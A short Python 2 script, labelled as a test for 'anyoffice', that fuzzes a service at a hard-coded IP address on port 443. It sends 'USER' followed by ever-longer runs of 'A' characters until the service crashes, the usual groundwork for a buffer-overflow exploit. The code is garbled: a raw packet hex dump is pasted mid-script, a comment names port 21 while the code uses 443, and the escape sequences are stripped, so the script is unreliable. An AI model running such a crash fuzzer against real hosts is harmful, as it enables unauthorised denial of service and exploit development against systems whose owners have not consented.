#encoding:utf-8
#description:test for anyoffice
import socket
from time import sleep

ip = "14.23.106.27"
port = 443
buff = 'x41'*50

08 57 00 c5 6f e2 c4 43 8f 46 a9 41 08 00 45 00
00 34 77 f8 40 00 40 06 88 8b c0 a8 01 66 0e 17
6a 1b ac 48 01 bb aa 8e 7a dd a9 5a 20 6b 80 10
75 90 3a 67 00 00 01 01 08 0a 00 ea 5b b8 66 62
10 7c
while True:

    try:
        # Make a connection to target system on TCP/21
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        s.recv(1024)

        print "Sending buffer with length: "+str(len(buff))
        # Send in string 'USER' + the string 'buff'
        s.send("USER "+buff+"rn")
        s.close()
        sleep(1)
        # Increase the buff string by 50 A's and then the loop continues
        buff = buff + 'x41'*50
    except:
        print "[+] Crash occured with buffer length: "+str(len(buff)-50)
